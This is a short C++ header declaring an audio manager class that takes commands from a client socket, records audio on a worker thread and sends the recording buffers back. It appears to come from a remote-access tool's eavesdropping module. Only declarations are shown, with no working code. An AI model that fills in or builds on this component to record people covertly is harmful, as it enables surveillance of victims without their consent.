#ifndef __TSP_AUDIOMANAGER_H__
#define __TSP_AUDIOMANAGER_H__

#include "Manager.h"
#include "Audio.h"

class CAudioManager : public CManager  
{
public:
	CAudioManager(CClientSocket *pClient);
	virtual ~CAudioManager();

public:
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

private:
	int	sendRecordBuffer();
	BOOL Initialize();
	static DWORD WINAPI WorkThread(LPVOID lparam);

private:
	CAudio *m_lpAudio;
	HANDLE m_hWorkThread;
	static BOOL m_bIsWorking;
};

#endif //__TSP_AUDIOMANAGER_H__
